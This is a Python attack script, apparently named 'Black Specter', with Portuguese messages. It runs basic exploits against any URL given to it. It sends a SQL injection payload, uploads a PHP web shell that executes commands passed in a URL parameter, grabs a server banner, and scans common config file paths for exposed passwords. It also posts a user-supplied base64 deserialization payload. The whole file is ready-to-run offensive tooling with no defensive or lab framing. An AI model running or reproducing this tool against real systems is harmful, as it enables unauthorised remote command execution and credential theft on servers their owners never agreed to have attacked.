import requests
import socket
import base64

ASCII_ART = r'''
███████████  ████                     █████                          
░░███░░░░░███░░███                    ░░███                          
 ░███    ░███ ░███   ██████    ██████  ░███ █████                    
 ░██████████  ░███  ░░░░░███  ███░░███ ░███░░███                     
 ░███░░░░░███ ░███   ███████ ░███ ░░░  ░██████░                      
 ░███    ░███ ░███  ███░░███ ░███  ███ ░███░░███                     
 ███████████  █████░░████████░░██████  ████ █████                    
░░░░░░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░                     
                                                                    
                                                                    
                                                                    
  █████████                               █████                       
 ███░░░░░███                             ░░███                       
░███    ░░░  ████████   ██████   ██████  ███████    ██████  ████████
░░█████████ ░░███░░███ ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░░░░░░░░███ ░███ ░███░███████ ░███ ░░░   ░███    ░███████  ░███ ░░░
 ███    ░███ ░███ ░███░███░░░  ░███  ███  ░███ ███░███░░░   ░███    
░░█████████  ░███████ ░░██████ ░░██████   ░░█████ ░░██████  █████   
 ░░░░░░░░░   ░███░░░   ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░   
             ░███                                                  
             █████                                                 
            ░░░░░                                                 
'''

def log(msg):
    print(msg)

class SQLiExploit:
    def __init__(self, target, vuln_path='/vuln.php', param='id'):
        self.url = target.rstrip('/') + vuln_path
        self.param = param

    def run(self):
        payload = "' OR '1'='1"
        params = {self.param: payload}
        try:
            r = requests.get(self.url, params=params, timeout=10)
            if r.status_code == 200 and len(r.text) > 0:
                log("[SQLi] Resposta recebida, verifique manualmente se há injeção.")
                print(r.text[:500])
            else:
                log("[SQLi] Resposta inesperada ou vazia.")
        except Exception as e:
            log(f"[SQLi] Erro: {e}")

class UploadExploit:
    def __init__(self, target, upload_path='/upload.php', file_param='file'):
        self.url = target.rstrip('/') + upload_path
        self.file_param = file_param

    def run(self):
        shell = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
        files = {self.file_param: ('shell.php', shell, 'application/x-php')}
        try:
            r = requests.post(self.url, files=files, timeout=10)
            if r.status_code == 200:
                log("[Upload] Upload pode ter sido feito, verifique o local do arquivo shell.php")
                print(r.text[:500])
            else:
                log(f"[Upload] Falha no upload, status {r.status_code}")
        except Exception as e:
            log(f"[Upload] Erro: {e}")

class BannerGrabber:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode(errors='ignore')
            log(f"[Banner] Banner capturado:\n{banner}")
            s.close()
        except Exception as e:
            log(f"[Banner] Erro: {e}")

class ConfigFinder:
    def __init__(self, target, paths=None):
        if paths is None:
            paths = ['/config.php', '/config.json', '/config.ini', '/settings.py']
        self.target = target.rstrip('/')
        self.paths = paths

    def run(self):
        for path in self.paths:
            url = self.target + path
            try:
                r = requests.get(url, timeout=10)
                if r.status_code == 200 and ('password' in r.text.lower() or 'passwd' in r.text.lower()):
                    log(f"[Config] Possível arquivo config exposto: {url}")
                    print(r.text[:500])
                else:
                    log(f"[Config] Não encontrado: {url}")
            except Exception as e:
                log(f"[Config] Erro em {url}: {e}")

class DeserializationExploit:
    def __init__(self, target, vuln_path='/deserialize', payload_b64=None):
        self.url = target.rstrip('/') + vuln_path
        self.payload = base64.b64decode(payload_b64) if payload_b64 else b''

    def run(self):
        headers = {'Content-Type': 'application/octet-stream'}
        try:
            r = requests.post(self.url, data=self.payload, headers=headers, timeout=10)
            if r.status_code == 200:
                log("[Deserialization] Resposta recebida, verifique se houve sucesso.")
                print(r.text[:500])
            else:
                log(f"[Deserialization] Status inesperado: {r.status_code}")
        except Exception as e:
            log(f"[Deserialization] Erro: {e}")

if __name__ == "__main__":
    import argparse

    print(ASCII_ART)

    parser = argparse.ArgumentParser(description="Exploração real de vulnerabilidades básicas.")
    parser.add_argument("target", help="URL alvo, ex: http://site.com")
    parser.add_argument("--sqlipath", default="/vuln.php", help="Caminho vulnerável para SQLi")
    parser.add_argument("--sqliparam", default="id", help="Parâmetro vulnerável para SQLi")
    parser.add_argument("--uploadpath", default="/upload.php", help="Caminho para upload")
    parser.add_argument("--uploadparam", default="file", help="Parâmetro do arquivo no upload")
    parser.add_argument("--bannerport", type=int, default=80, help="Porta para captura de banner")
    parser.add_argument("--deserpath", default="/deserialize", help="Caminho para deserialização")
    parser.add_argument("--deserpayload", default=None, help="Payload base64 para deserialização")
    args = parser.parse_args()

    sqli = SQLiExploit(args.target, vuln_path=args.sqlipath, param=args.sqliparam)
    sqli.run()

    upload = UploadExploit(args.target, upload_path=args.uploadpath, file_param=args.uploadparam)
    upload.run()

    banner = BannerGrabber(args.target.replace('http://','').replace('https://','').split('/')[0], port=args.bannerport)
    banner.run()

    config = ConfigFinder(args.target)
    config.run()

    deser = DeserializationExploit(args.target, vuln_path=args.deserpath, payload_b64=args.deserpayload)
    deser.run()


